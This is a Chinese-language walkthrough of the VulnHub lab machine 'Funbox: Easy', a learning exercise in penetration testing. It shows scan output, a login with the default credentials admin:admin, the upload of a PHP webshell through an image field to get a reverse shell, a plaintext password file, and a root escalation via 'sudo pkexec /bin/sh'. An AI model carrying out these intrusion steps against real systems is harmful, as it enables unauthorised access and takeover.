# Funbox: Easy

2024-5-17 https://www.vulnhub.com/entry/funbox-3,526/

difficulty: easy

## IP

192.168.5.29

## Scan

Open Port -> 22,80,33060

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b2d8516ec584051908ebc8582713132f (RSA)
|   256 b0de9703a72ff4e2ab4a9cd9439b8a48 (ECDSA)
|_  256 9d0f9a26384f0180a7a6809dd1d4cfec (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_gym
|_http-title: Apache2 Ubuntu Default Page: It works
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
```

先对 80web 服务进行目录扫描：

```
gobuster dir -u http://192.168.5.29/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e

http://192.168.5.29/.php                 (Status: 403) [Size: 277]
http://192.168.5.29/.html                (Status: 403) [Size: 277]
http://192.168.5.29/index.html           (Status: 200) [Size: 10918]
http://192.168.5.29/index.php            (Status: 200) [Size: 3468]
http://192.168.5.29/header.php           (Status: 200) [Size: 1666]
http://192.168.5.29/profile.php          (Status: 302) [Size: 7247] [--> http://192.168.5.29/index.php]
http://192.168.5.29/store                (Status: 301) [Size: 312] [--> http://192.168.5.29/store/]
http://192.168.5.29/admin                (Status: 301) [Size: 312] [--> http://192.168.5.29/admin/]
http://192.168.5.29/registration.php     (Status: 200) [Size: 9409]
http://192.168.5.29/logout.php           (Status: 200) [Size: 75]
http://192.168.5.29/robots.txt           (Status: 200) [Size: 14]
http://192.168.5.29/dashboard.php        (Status: 302) [Size: 10272] [--> http://192.168.5.29/index.php]
http://192.168.5.29/secret               (Status: 301) [Size: 313] [--> http://192.168.5.29/secret/]
http://192.168.5.29/leftbar.php          (Status: 200) [Size: 1837]
http://192.168.5.29/forgot-password.php  (Status: 200) [Size: 2763]
http://192.168.5.29/.html                (Status: 403) [Size: 277]
http://192.168.5.29/.php                 (Status: 403) [Size: 277]
http://192.168.5.29/gym                  (Status: 301) [Size: 310] [--> http://192.168.5.29/gym/]
http://192.168.5.29/hitcounter.txt       (Status: 200) [Size: 1]
http://192.168.5.29/server-status        (Status: 403) [Size: 277]
```

发现可访问的链接比较多，根据靶场提示，可能很多都是兔子洞。

通过进行分析，发现了 http://192.168.5.29/admin/ 这个 crm 的登陆用户存在 sql 注入，但是没有可以插入 webshell 的地方。

http://192.168.5.29/store/admin.php 这个入口存在弱密码，用户凭据为 admin:admin

登陆后，添加新的书籍，在 Image 处，上传自己的 php 后门代码。在 http://192.168.5.29/store/bootstrap/img/ 中就能看到我们上传的后门代码，在 kali 上监听 8888 端口，访问我们的 webshell 后门页面，就能得到反弹的链接。

在 /home/tony 目录中发现线索：

```
www-data@funbox3:/home/tony$ cat password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

tony 的 ssh 密码为：yxcvbnmYYY

su tony 切换到该用户。

sudo -l 发现 tony 用户有很多可执行命令：

```
(root) NOPASSWD: /usr/bin/yelp
(root) NOPASSWD: /usr/bin/dmf
(root) NOPASSWD: /usr/bin/whois
(root) NOPASSWD: /usr/bin/rlogin
(root) NOPASSWD: /usr/bin/pkexec
(root) NOPASSWD: /usr/bin/mtr
(root) NOPASSWD: /usr/bin/finger
(root) NOPASSWD: /usr/bin/time
(root) NOPASSWD: /usr/bin/cancel
(root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

```
tony@funbox3:~$ sudo pkexec /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

最终得到了 root 权限：

```
# cat root.flag
 __________          ___.                      ___________
\_   _____/_ __  ____\_ |__   _______  ___ /\  \_   _____/____    _________.__.
 |    __)|  |  \/    \| __ \ /  _ \  \/  / \/   |    __)_\__  \  /  ___<   |  |
 |     \ |  |  /   |  \ \_\ (  <_> >    <  /\   |        \/ __ \_\___ \ \___  |
 \___  / |____/|___|  /___  /\____/__/\_ \ \/  /_______  (____  /____  >/ ____|
     \/             \/    \/            \/             \/     \/     \/ \/

Made with ❤ from twitter@0815R2d2. Please, share this on twitter if you want.
```
